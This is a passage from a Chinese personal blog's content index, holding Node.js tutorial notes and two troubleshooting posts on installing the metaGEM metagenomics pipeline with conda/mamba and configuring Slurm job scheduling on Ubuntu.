connection 事件 eventEmitter.emit(&#x27;connection&#x27;); console.log(&quot;程序执行完毕。&quot;); b.EventEmitter类Node.js 所有的异步 I&#x2F;O 操作在完成时都会发送一个事件到事件队列。 Node.js 里面的许多对象都会分发事件：一个 net.Server 对象会在每次有新连接时触发一个事件， 一个 fs.readStream 对象会在文件被打开的时候触发一个事件。 所有这些产生事件的对象都是 events.EventEmitter 的实例。 EventEmitter 对象如果在实例化时发生错误，会触发 error 事件。当添加新的监听器时，newListener 事件会触发，当监听器被移除时，removeListener 事件被触发。 下面我们用一个简单的例子说明 EventEmitter 的用法： 123456789//event.js 文件var EventEmitter = require(&#x27;events&#x27;).EventEmitter; var event = new EventEmitter(); event.on(&#x27;some_event&#x27;, function() &#123; //绑定触发语句 console.log(&#x27;some_event 事件触发&#x27;); &#125;); setTimeout(function() &#123; event.emit(&#x27;some_event&#x27;); //触发&#125;, 1000); 可以绑定多个触发语句 12345678910//event.js 文件var events = require(&#x27;events&#x27;); var emitter = new events.EventEmitter(); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener1&#x27;, arg1, arg2); &#125;); emitter.on(&#x27;someEvent&#x27;, function(arg1, arg2) &#123; console.log(&#x27;listener2&#x27;, arg1, arg2); &#125;); emitter.emit(&#x27;someEvent&#x27;, &#x27;arg1 参数&#x27;, &#x27;arg2 参数&#x27;); 3.Buffer与Streama.BufferJavaScript 语言自身只有字符串数据类型，没有二进制数据类型。 但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。 字符编码 Buffer 实例一般用于表示编码字符的序列，比如 UTF-8 、 UCS2 、 Base64 、或十六进制编码的数据。 通过使用显式的字符编码，就可以在 Buffer 实例与普通的 JavaScript 字符串之间进行相互转换。 12345const buf = Buffer.from(&#x27;runoob&#x27;, &#x27;ascii&#x27;);// 输出 72756e6f6f62console.log(buf.toString(&#x27;hex&#x27;));// 输出 cnVub29iconsole.log(buf.toString(&#x27;base64&#x27;)); 读写数据 12buf.write(string[, offset[, length]][, encoding])buf.toString([encoding[, start[, end]]]) 转换成JSON对象 当字符串化一个 Buffer 实例时，JSON.stringify()会隐式地调用该 **toJSON()**。 返回JSON对象 1buf.toJSON() 例子 1234567891011121314const buf = Buffer.from([0x1, 0x2, 0x3, 0x4, 0x5]);const json = JSON.stringify(buf);// 输出: &#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;console.log(json);const copy = JSON.parse(json, (key, value) =&gt; &#123; return value &amp;&amp; value.type === &#x27;Buffer&#x27; ? Buffer.from(value.data) : value;&#125;);// 输出: &lt;Buffer 01 02 03 04 05&gt;console.log(copy); 输出为 12&#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;&lt;Buffer 01 02 03 04 05&gt; b.Stream读入流 1234567891011121314151617var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;// 创建可读流var readerStream = fs.createReadStream(&#x27;input.txt&#x27;);// 设置编码为 utf8。readerStream.setEncoding(&#x27;UTF8&#x27;);// 处理流事件 --&gt; data, end, and errorreaderStream.on(&#x27;data&#x27;, function(chunk) &#123; data += chunk;&#125;);readerStream.on(&#x27;end&#x27;,function()&#123; console.log(data);&#125;);readerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;程序执行完毕&quot;); 写入流 12345678910111213141516var fs = require(&quot;fs&quot;);var data = &#x27;菜鸟教程官网地址：www.runoob.com&#x27;;// 创建一个可以写入的流，写入到文件 output.txt 中var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 使用 utf8 编码写入数据writerStream.write(data,&#x27;UTF8&#x27;);// 标记文件末尾writerStream.end();// 处理流事件 --&gt; finish、errorwriterStream.on(&#x27;finish&#x27;, function() &#123; console.log(&quot;写入完成。&quot;);&#125;);writerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;程序执行完毕&quot;); 管道流 123456789var fs = require(&quot;fs&quot;);// 创建一个可读流var readerStream = fs.createReadStream(&#x27;input.txt&#x27;);// 创建一个可写流var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 管道读写操作// 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中readerStream.pipe(writerStream);console.log(&quot;程序执行完毕&quot;); 链式流 链式是通过连接输出流到另外一个流并创建多个流操作链的机制。链式流一般用于管道操作。 接下来我们就是用管道和链式来压缩和解压文件。 1234567var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// 压缩 input.txt 文件为 input.txt.gzfs.createReadStream(&#x27;input.txt&#x27;) .pipe(zlib.createGzip()) .pipe(fs.createWriteStream(&#x27;input.txt.gz&#x27;));console.log(&quot;文件压缩完成。&quot;); 4.模块系统为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。 模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C&#x2F;C++ 扩展。 引入模块 在 Node.js 中，引入一个模块非常简单，如下我们创建一个 main.js 文件并引入 hello 模块，代码如下: 12var hello = require(&#x27;./hello&#x27;);hello.world(); 以上实例中，代码 require(‘.&#x2F;hello’) 引入了当前目录下的 hello.js 文件（.&#x2F; 为当前目录，node.js 默认后缀为 js）。 Node.js 提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。 接下来我们就来创建 hello.js 文件，代码如下： 123exports.world = function() &#123; console.log(&#x27;Hello World&#x27;);&#125; 在以上示例中，hello.js 通过 exports 对象把 world 作为模块的访问接口，在 main.js 中通过 require(‘.&#x2F;hello’) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。 有时候我们只是想把一个对象封装到模块中，格式如下： 123module.exports = function() &#123; // ...&#125; 例如 1234567891011//hello.js function Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log(&#x27;Hello &#x27; + name); &#125;; &#125;; module.exports = Hello; 这样就可以直接获得这个对象了： 12345//main.js var Hello = require(&#x27;./hello&#x27;); hello = new Hello(); hello.setName(&#x27;BYVoid&#x27;); hello.sayHello(); 5.函数函数可以作为值进行传递如下 1234567function say(word) &#123; console.log(word);&#125;function execute(someFunction, value) &#123; someFunction(value);&#125;execute(say, &quot;Hello&quot;); 或者使用匿名函数，直接在另一个函数的括号中定义和传递这个函数： 1234function execute(someFunction, value) &#123; someFunction(value);&#125;execute(function(word)&#123; console.log(word) &#125;, &quot;Hello&quot;); 6.NodeJS路由我们要为路由提供请求的 URL 和其他需要的 GET 及 POST 参数，随后路由需要根据这些数据来执行相应的代码。 因此，我们需要查看 HTTP 请求，从中提取出请求的 URL 以及 GET&#x2F;POST 参数。这一功能应当属于路由还是服务器（甚至作为一个模块自身的功能）确实值得探讨，但这里暂定其为我们的HTTP服务器的功能。 我们需要的所有数据都会包含在 request 对象中，该对象作为 onRequest() 回调函数的第一个参数传递。但是为了解析这些数据，我们需要额外的 Node.JS 模块，它们分别是 url 和 querystring 模块。 12345678910111213url.parse(string).query | url.parse(string).pathname | | | | | ------ -------------------http://localhost:8888/start?foo=bar&amp;hello=world --- ----- | | | | querystring.parse(queryString)[&quot;foo&quot;] | | querystring.parse(queryString)[&quot;hello&quot;] (菜鸟这个图做的太棒了) 现在我们来给 onRequest() 函数加上一些逻辑，用来找出浏览器请求的 URL 路径： server.js代码 1234567891011121314151617181920var http = require(&quot;http&quot;);var url = require(&quot;url&quot;); function start(route) &#123; function onRequest(request, response) &#123; var pathname = url.parse(request.url).pathname; console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); route(pathname); response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end(); &#125; http.createServer(onRequest).listen(8888); console.log(&quot;Server has started.&quot;);&#125; exports.start = start; router.js代码 12345function route(pathname) &#123; console.log(&quot;About to route a request for &quot; + pathname);&#125; exports.route = route; index.js代码 123var server = require(&quot;./server&quot;);var router = require(&quot;./router&quot;);server.start(router.route); 7.全局对象JavaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即全局变量。 在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是 global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。 在 Node.js 我们可以直接访问到 global 的属性，而不需要在应用中包含它。 略","categories":[{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.1(二)","slug":"metaGEM使用小记-解决各种问题-2024-2（二）-daf9e5675b4d49cc855dd652b38a99e5","date":"2024-01-28T16:00:00.000Z","updated":"2024-02-17T15:38:43.995Z","comments":true,"path":"2024/01/29/metaGEM使用小记-解决各种问题-2024-2（二）-daf9e5675b4d49cc855dd652b38a99e5/","link":"","permalink":"https://snowman12137.github.io/2024/01/29/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-2%EF%BC%88%E4%BA%8C%EF%BC%89-daf9e5675b4d49cc855dd652b38a99e5/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.2（二）书接上文，貌似配置还有点问题。跑了半天以后迟迟看不到结果，htop一看CPU占用几乎为0，应该是没跑起来，squeue 再一看，状态是PD，意思是等待，正常情况应该是R。于是我有网上找了下原因，说只有空闲条件满足job的运行条件才会运行。 我做了以下操作： 先scancle 掉所有队列里的人物 修改slurm.config 的参数稍大一些 重新启动sudo systemctl restart slurmd &amp; sudo systemctl restart slurmctld 更改bash metaGEM.sh -t fastp -j 2 -c 2 -m 10 -h 2 中m(内存)的大小和j(任务数量)的大小 运行报错 12sbatch: error: Memory specification can not be satisfiedsbatch: error: Batch job submission failed: Requested node configuration is not available 再排查一下scontrol show nodes 我们熟悉的报错又回来了（状态又是drain） 查了好久好久在sudo cat /var/log/slurm-llnl/slurmctld.log 里面找到了错误 就是NodeName那一行的配置Sockets和CoresPerSocket不仅要小于上一章讲的bash cxc.sh 的文件中的值，还要小于日志文件中数字前面的值，如(20&lt;SocketsCoresPerSocket) 那么SocketsCoresPerSocket的积要小于20才可以。 如果日志长这样那么八成就可以启动了 然后我们输入，改变节点的状态成空闲(注意一定要是sudo权限) 1sudo scontrol update NodeName=your_node_name State=idle 1.问题:成功运行程序但是瞬间完成，并无输出结果排查！ 在/var/log/slurm-llnl/slurmctld.log 里面显示 123[2024-01-29T15:37:19.292] sched: Allocate JobId=73 NodeList=your_computer #CPUs=8 Partition=your_computer[2024-01-29T15:37:20.367] _job_complete: JobId=73 WEXITSTATUS 1[2024-01-29T15:37:20.367] _job_complete: JobId=73 done 再排查/var/log/slurm-llnl/slurmd.log 无法创建输出文件 这属于slurm的BUG之一，只能先创建文件然后再创建文件夹 所以我们是能手动mkdir log 然后再运行 2.运行时日志文件中报错&#x2F;usr&#x2F;bin&#x2F;bash: line 2: activate: No such file or directory 猜测是这里面envs/metagem 的工作路径有变化，所以我们改成绝对路径试一下 1set +u;source activate envs/metagem;set -u; 如何更改，提交给slurm处理的脚本是由snakemake生成的，因此我们找到这一句 1source activate &#123;config[envs][metagem]&#125; 发现读取的config是config.ymal文件 应该在config.yaml文件里改这里，改成绝对路径 原来不是这个问题（服了） 当使用source activate env_name时，设置conda路径到环境变量即可 1export PATH=&quot;/home/gc/anaconda3/bin:$PATH&quot; 另外再shell脚本中启用conda环境一定要使用source不能使用conda。 成功运行（泪目）！！！ 成功运行（泪目）！！ 成功运行（泪目）！ 成功运行（泪目 成功运行（泪 成功运行（ 成功运行 成功运 成功 成","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.1(一)","slug":"metaGEM使用小记-解决各种问题-2024-1-2a55eec867d5441b9829bd5428024882","date":"2024-01-27T16:00:00.000Z","updated":"2024-02-17T15:38:50.537Z","comments":true,"path":"2024/01/28/metaGEM使用小记-解决各种问题-2024-1-2a55eec867d5441b9829bd5428024882/","link":"","permalink":"https://snowman12137.github.io/2024/01/28/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-1-2a55eec867d5441b9829bd5428024882/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.1(一)前言，如何把数据从百度云上下载到linux服务器上可以直接通过pip下载：pip install bypy -y 第一次使用时需要随便输入一个命令以激活授权界面，如输入 bypy info 然后打开提示的连接 将复制的内容粘贴到终端后回车，等待即可。 登陆成功后会提示如下信息 登录百度网盘(我的应用数据&#x2F;bypy&#x2F;你的文件名&#x2F;*&#x2F;文件) 有多个文件建议十个放到一个文件夹里，这样下载出错方便排查 我写了一个脚本可以自动安装download.sh 1234567bypy downdir /RAW-NCBI/0/ ./0/bypy downdir /RAW-NCBI/1/ ./1/bypy downdir /RAW-NCBI/2/ ./2/bypy downdir /RAW-NCBI/3/ ./3/bypy downdir /RAW-NCBI/4/ ./4/bypy downdir /RAW-NCBI/5/ ./5/bypy downdir /RAW-NCBI/6/ ./6/ 因为我有74个文件，因此分成了7组进行下载 在你想存储的文件夹里输入 1nohup bash [download.sh](http://download.sh) &gt; temp.txt &amp; (nohup是在Linux中永久运行的命令，&amp;和其他方式均会因为终端退出而中断。&gt;把下载的过程信息存储到temp.txt，&amp;并放在后台运行，这样下载文件的任务就会自动放到后台了) A.安装123git clone https://github.com/franciscozorrilla/metaGEM.gitcd metaGEMbash env_setup.sh 1.找不到env_setup.sh路径env_setup.sh放在了metaGEM&#x2F;workflow&#x2F;scripts&#x2F;env_setup.sh 但是env_setup.sh里面所有的文件路径是在metaGEM&#x2F;workflow&#x2F;下面的，所以要把env_setup.sh复制到metaGEM&#x2F;workflow&#x2F;下面运行 详解env_setup.sh文件(提取其中关键部分)(已安装anaconda) 123456789conda create -n mamba mamba -c conda-forge #创建新环境下载mabaconda activate mamba #进入mamba环境mamba env create --prefix ./envs/metagem -f envs/metaGEM_env.yml &amp;&amp; source activate envs/metagem &amp;&amp; pip install --user memote carveme smetana #创建metaGEM环境mamba env create --prefix ./envs/metawrap -f envs/metaWRAP_env.yml #创建metaWRAP环境mamba env create --prefix ./envs/prokkaroary -f envs/prokkaroary_env.yml #创建prokkaroary环境#不重要:download-db.sh &amp;&amp; source deactivate &amp;&amp; source activate mamba#下载GTDB-tk database (~25 Gb)数据集(丢失download-db.sh文件无法下载)wget https://data.ace.uq.edu.au/public/CheckM_databases/checkm_data_2015_01_16.tar.gz #下载CheckM(275MB) 数据集 因为conda install 下载速度很慢，所以脚本里使用了mamba方式进行下载。使用方法为下载mamba包，然后在此环境下进行下载，如 mamba install requests 上述文件中mamba env create为创建新环境的语句，-f后面的.yml文件为导出的conda标准环境文件，–prefix 为新创建环境的路径 2.在安装metagem时以下界面卡住 在正常加载时，以下界面至少卡住了20h以上，因此排除网络问题 我们看一下对应的metaGEM_env.yml文件内容 该文件为conda标准创建环境的文件格式 123456789101112131415161718192021name: metagemchannels: - conda-forge - bioconda - defaultsdependencies: - bedtools&gt;=2.29.2 - bwa&gt;=0.7.17 - concoct&gt;=1.1.0 - diamond&gt;=2.0.6 - fastp&gt;=0.20.1 - gtdbtk&gt;=1.4.0 - maxbin2&gt;=2.2.7 - megahit&gt;=1.2.9 - metabat2&gt;=2.15 - r-base&gt;=3.5.1 - r-gridextra&gt;=2.2.1 - r-tidyverse - r-tidytext - samtools&gt;=1.9 - snakemake&gt;=5.10.0,&lt;5.31.1 name指的是创建环境的名称，channels指的是下载通道，其中这个conda-forge是比较重要的一个，其是一个用于托管和发布科学计算、数据分析和机器学习的Python 包的社区项目。在conda-forge通道中，您可以找到为conda构建但尚未成为官方Anaconda发行版一部分的包。有一些Python库不能用简单的conda install安装，因为除非应用conda-forge，否则它们的通道是不可用的。根据我的经验，pip比conda更适合研究不同的通道源。例如，如果你想安装python-constraint，你可以通过pip install来安装，但是要通过cond 来安装。您必须指定通道- conda-forge。 我在网上看到有人说用forge走的是外网，因此很慢导致加载卡住，因此，我把channels全部注释掉(默认没有channels项)然后测试，依然失败。 注：如果安装出现了Solving environment: failed with initial frozen solve. Retrying with flexible solve 错误 解决博客 12conda update -n base condaconda update --all 即可解决 在后面的测试中，我发现metawrap和prokkaroary的安装 于是我们把后面的大于等于去掉在进行测试，等了一个小时也没有结果也失败了。 于是我们用土办法，创建环境然后一个一个手动输入加载 12345conda create -p ./envs/metagem python=3.10conda info --envconda activate /home/gc/metaGEM-master/workflow/envs/metagem conda install -c conda-forge bedtools bwa concoct diamond fastp gtdbtk maxbin2 megahit metabat2 r-base r-gridextra r-tidyverse r-tidytext samtools snakemake=5.10.0 -ypip install --user memote carveme smetana 或者以下脚本 因为我每次下载都会报错JASON错误，网上一查是因为缓存的问题，因此我在每一个软件包安装之后会清理缓存，暂时我对这个问题没有很好的解决方法，如果没有这个问题的同学可以删除所有conda clean -i -y 语句，当然保留也没有任何问题。其次bioconda:: 这里面的库都是用bioconda 通道下载的，因此安装时要加上这个语句，不加的话很多包安装不上去。 123456789101112131415161718192021222324252627282930313233conda create -p ./envs/metagem python=3.10 -yconda activate ./envs/metagemconda clean -i -yconda install bioconda::bedtools -yconda clean -i -yconda install bioconda::bwa -yconda clean -i -yconda install bioconda::concoct -yconda clean -i -yconda install bioconda::diamond -yconda clean -i -yconda install bioconda::fastp -yconda clean -i -yconda install bioconda::gtdbtk -yconda clean -i -yconda install bioconda::maxbin2 -yconda clean -i -yconda install bioconda::megahit -yconda clean -i -yconda install bioconda::metabat2 -yconda clean -i -yconda install bioconda::r-base -yconda clean -i -yconda install bioconda::r-gridextra -yconda clean -i -yconda install bioconda::r-tidyverse -yconda clean -i -yconda install bioconda::r-tidytext -yconda clean -i -yconda install bioconda::samtools -yconda clean -i -yconda install bioconda::snakemake=5.10.0 -ypip install --user memote carveme smetana B.执行metaGEM.sh在dataset文件夹中的子目录中存放paierd-end的fastq数据，如下所示。MetGEM 将基于dataset文件夹中存在的子文件夹读取示例 ID，并将这些 ID 提供给 Snakefile 作为作业提交的通配符。 我的运行文件树如下图所示 12345678910111213141516171819202122232425262728├── colab│ └── assemblies├── config.yaml├── dataset│ ├── L1EFG190305--AM43│ ├── L1EFG190306--AM51│ ├── L1EFG190309_L1EFG190309--AM61│ ├── L1EFG190324--AW1│ ├── L1EFG190325--AW2│ ├── L1EFG190326--AW3│ └── L1EFG190327--AW4├── envs│ ├── metagem│ ├── metaGEM_env_long.yml│ ├── metaGEM_env.yml│ ├── metaWRAP_env.yml│ ├── prokkaroary│ └── prokkaroary_env.yml├── env_setup.sh├── metaGEM.sh├── rules│ ├── kallisto2concoctTable.smk│ ├── maxbin_single.smk│ ├── metabat_single.smk│ ├── Snakefile_experimental.smk.py│ └── Snakefile_single_end.smk.py├── scripts/└── Snakefile 使用fastp质量过滤reads 每个样本提交一个质量过滤工作，每个过滤工作有2个CPU和20GB 内存，最大运行时间为2小时 1bash metaGEM.sh -t fastp -j 2 -c 2 -m 20 -h 2 1.报错找不到路径 更改config/config.yaml 文件第一行的执行路径即可 如果还是找不到路径则在Snakefile中第一行更改config的路径 如果还是读取不到，则把config.yaml 文件复制到当前文件夹下 2.报错Error parsing number of cores (–cores, -c, -j): must be integer, empty, or ‘all’.第一种情况snakemake版本过高，降低到5.10.0即可解决 第二种情况未执行pip install –user memote carveme smetana 3.报错找不到分析的数据在snakefile文件中，我们可以看到第16&#x2F;17行表示在dataset文件夹下，每一个文件名下面有两个同名加_R1,_R2的文件夹，因此我们要现将文件进行标准化操作， 以下是我们的原始文件数据 我们要把他们进行分类，并且进行改名操作，因此我写了一个自动化分类脚本 123456789101112131415161718192021dataset_path=&quot;/home/gc/bash_all/0&quot; #标准数据的文件夹path_name=&quot;z&quot;tar_path=&quot;/home/gc/metaGEM-master/workflow/dataset&quot; #目标dataset文件夹temp=0for file in `ls $&#123;dataset_path&#125;/`do echo $&#123;file&#125; if (($temp==0)) then mid_temp=$file temp=1 else #命令执行处 #echo $&#123;mid_temp:0:-16&#125; #!!!注意这里，因为我的文件里面后16个字符是固定的，需要替换成如下格式，因此我们把字符串截到16$&#123;mid_temp:0:-16&#125;，如果你的文件后缀不一样，请按照需要更改所有&#x27;16&#x27;的地方 mkdir $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125; mv $&#123;dataset_path&#125;/$&#123;mid_temp:0:-16&#125;.R1.raw.fastq.gz $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125;/$&#123;mid_temp:0:-16&#125;_R1.fastq.gz mv $&#123;dataset_path&#125;/$&#123;mid_temp:0:-16&#125;.R2.raw.fastq.gz $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125;/$&#123;mid_temp:0:-16&#125;_R2.fastq.gz temp=0 fidone 4.提交任务后，nohup.out提示sbatch: error: s_p_parse_file: unable to status file &#x2F;etc&#x2F;slurm-llnl&#x2F;slurm.conf: No such file or directory, retrying in 1sec up to 60sec(有的同学会提示&#x2F;bin&#x2F;sh: sbatch: command not found 之类的，这是没有安装slurm导致的看到有一篇文章写到需要这样安装https://www.thegeekdiary.com/sbatch-command-not-found/) Distribution Command Debian apt-get install slurm-client Ubuntu apt-get install slurm-client Kali Linux apt-get install slurm-client Fedora dnf install slurm OS X brew install slurm Raspbian apt-get install slurm-client 配置slurm有问题，slurm是一个linux服务器中的集群管理和作业调度系统，是项目里很关键的一点，因此要好好学习这里的配置信息 先看看文件 1ls -l /etc/slurm/ 报错没有此文件，表明还没有安装slurm 弯路(后面还有未解决的报错) ———————————————分割线以内的不要使用！！————————————————— (失败的教程) https://blog.csdn.net/r1141207831/article/details/125272108 先从https://www.schedmd.com/这里下载，选择对应的版本 12345678910#编译安装前需安装gccyum -y install gcc#接着解压安装tar -jxvf slurm-16.05.11.tar.bz2cd /root/slurm-16.05.11./configuremakemake install#安装成功！ 在make和make install时出现 Ld 返回的1退出状态错误是以前错误的结果。有一个更早的错误ーー对‘hdf5各种方法的未定义引用造成的，因此我猜测是linux版本与slurm版本不同造成的，因此我找了一个适用于Ubuntu20.04 的slurm安装教程 最全slurm安装包列表如下https://src.fedoraproject.org/lookaside/extras/slurm/ a、安装必要文件 12sudo suapt-get install make hwloc libhwloc-dev libmunge-dev libmunge2 munge mariadb-server libmysqlclient-dev -y b、启动启动munge服务 123systemctl enable munge // 设置munge开机自启动systemctl start munge // 启动munge服务systemctl status munge // 查看munge状态 c、编译安装slurm 1234567# 将slurm-21.08.6.tar.bz2源码包放置在/home/fz/package目录下cd /home/fz/packagetar -jxvf slurm-21.08.6.tar.bz2cd slurm-21.08.6/./configure --prefix=/opt/slurm/21.08.6 --sysconfdir=/opt/slurm/21.08.6/etcmake -j16make install 在make时发现缺少hdf5包 我又尝试使用spack高效的包管理器安装hdf5 https://hpc.pku.edu.cn/_book&#x2F;guide&#x2F;soft_env&#x2F;spack.html（教程） 但是报错如下，只能进行手动下载编译 官网下载hdf5 https://support.hdfgroup.org/ftp/HDF5/releases/ 12345678910111213141516171819sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压cd hdf5-1.8.21/ #sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压#依次执行sudo ./configure --prefix=/usr/local/hdf5sudo make #会有很多五颜六色的警告，忽略掉，sudo make check sudo make install#安装成功后，在安装目录/usr/local下出现hdf5文件夹，打开后再切换到该目录下cd /usr/local/hdf5/share/hdf5_examples/csudo ./run-c-ex.sh#执行命令sudo h5cc -o h5_extend h5_extend #如果显示错误，则安装：sudo apt install hdf5-helperssudo apt-get install libhdf5-serial-dev#再执行 sudo h5cc -o h5_extend h5_extend.c #直到执行后没有错误显示#执行命令 sudo ./h5_extend 12345678910111213141516171819sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压cd hdf5-1.8.21/ #sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压#依次执行sudo ./configure --prefix=/usr/local/hdf5sudo make #会有很多五颜六色的警告，忽略掉，sudo make check sudo make install#安装成功后，在安装目录/usr/local下出现hdf5文件夹，打开后再切换到该目录下cd /usr/local/hdf5/share/hdf5_examples/csudo ./run-c-ex.sh#执行命令sudo h5cc -o h5_extend h5_extend #如果显示错误，则安装：sudo apt install hdf5-helperssudo apt-get install libhdf5-serial-dev#再执行 sudo h5cc -o h5_extend h5_extend.c #直到执行后没有错误显示#执行命令 sudo ./h5_extend 装完hdf5后继续make slurm 没有报错！！！完成安装 完成安装，下面进行配置 d、启动数据库 后面是无限的hostname报错，我又重新找了一个教程，这个环境被污染了，如果使用另一个教程装slurm会冲突，但是这个又卸载不干净，于是重做了系统，在另一个教程上面成功了 ———————————————分割线以内的不要使用！！————————————————— 正确的教程如下来自https://wxyhgk.com/article%2Fubuntu-slurm(这个文章讲的太好了) 安装与配置1234#安装slurmsudo apt install slurm-wlm slurm-wlm-doc -y#检查是否安装成功slurmd --version 配置slurm 配置文件是放在 /etc/slurm-llnl/ 下面的，使用命令 1sudo vi /etc/slurm-llnl/slurm.conf 填写如下内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687ClusterName=coolControlMachine=master#ControlAddr=#BackupController=#BackupAddr=#MailProg=/usr/bin/s-nailSlurmUser=root#SlurmdUser=rootSlurmctldPort=6817SlurmdPort=6818AuthType=auth/munge#JobCredentialPrivateKey=#JobCredentialPublicCertificate=StateSaveLocation=/var/spool/slurmctldSlurmdSpoolDir=/var/spool/slurmdSwitchType=switch/noneMpiDefault=noneSlurmctldPidFile=/var/run/slurmctld.pidSlurmdPidFile=/var/run/slurmd.pidProctrackType=proctrack/pgid#PluginDir=#FirstJobId=ReturnToService=0#MaxJobCount=#PlugStackConfig=#PropagatePrioProcess=#PropagateResourceLimits=#PropagateResourceLimitsExcept=#Prolog=#Epilog=#SrunProlog=#SrunEpilog=#TaskProlog=#TaskEpilog=#TaskPlugin=#TrackWCKey=no#TreeWidth=50#TmpFS=#UsePAM=## TIMERSSlurmctldTimeout=300SlurmdTimeout=300InactiveLimit=0MinJobAge=300KillWait=30Waittime=0## SCHEDULINGSchedulerType=sched/backfill#SchedulerAuth=#SelectType=select/linear#PriorityType=priority/multifactor#PriorityDecayHalfLife=14-0#PriorityUsageResetPeriod=14-0#PriorityWeightFairshare=100000#PriorityWeightAge=1000#PriorityWeightPartition=10000#PriorityWeightJobSize=1000#PriorityMaxAge=1-0## LOGGINGSlurmctldDebug=infoSlurmctldLogFile=/var/log/slurm-llnl/slurmctld.logSlurmdDebug=infoSlurmdLogFile=/var/log/slurm-llnl/slurmd.logJobCompType=jobcomp/none#JobCompLoc=## ACCOUNTING#JobAcctGatherType=jobacct_gather/linux#JobAcctGatherFrequency=30##AccountingStorageType=accounting_storage/slurmdbd#AccountingStorageHost=#AccountingStorageLoc=#AccountingStoragePass=#AccountingStorageUser=## COMPUTE NODESPartitionName=master Nodes=master Default=NO MaxTime=INFINITE State=UP#NodeName=master State=UNKNOWNNodeName=master Sockets=2 CoresPerSocket=16 ThreadsPerCore=1 State=UNKNOWN 上面的代码中的 ControlMachine&#x3D;master PartitionName&#x3D;master Nodes&#x3D;master Default&#x3D;NO MaxTime&#x3D;INFINITE State&#x3D;UP#NodeName&#x3D;master State&#x3D;UNKNOWNNodeName&#x3D;master Sockets&#x3D;2 CoresPerSocket&#x3D;16 ThreadsPerCore&#x3D;1 State&#x3D;UNKNOWN 我 黑体 和 斜体 的地方需要修改，这两部分是是需要修改的，其他的别动。 黑体部分修改 使用 hostname 命令可以查看到你的名字，然后把你的到的名字替换上面的 master 斜体部分修改 这部分稍微有点复杂，首先来解释各个名字的意思 Sockets 代表你服务器cpu的个数 CoresPerSocket 代表每个cpu的核数 ThreadsPerCore 代表是否开启超线程，如果开启了超线程就是2，没有开启就是1 使用vi [cxc.sh](http://cxc.sh/) 写以下脚本 1234567891011121314#!/bin/bashcpunum=`cat /proc/cpuinfo| grep &quot;physical id&quot;| sort| uniq| wc -l`echo &quot;CPU 个数: $cpunum&quot;;cpuhx=`cat /proc/cpuinfo | grep &quot;cores&quot; | uniq | awk -F&quot;:&quot; &#x27;&#123;print $2&#125;&#x27;`echo &quot;CPU 核心数：$cpuhx&quot; ; cpuxc=`cat /proc/cpuinfo | grep &quot;processor&quot; | wc -l`echo &quot;CPU 线程数：$cpuxc&quot; ;if [[ `expr $cpunum\\*$[cpuhx*2] ` -eq $cpuxc ]];then echo &quot;开启了超线程&quot;else echo &quot;未开启超线程&quot;fi 然后使用命令 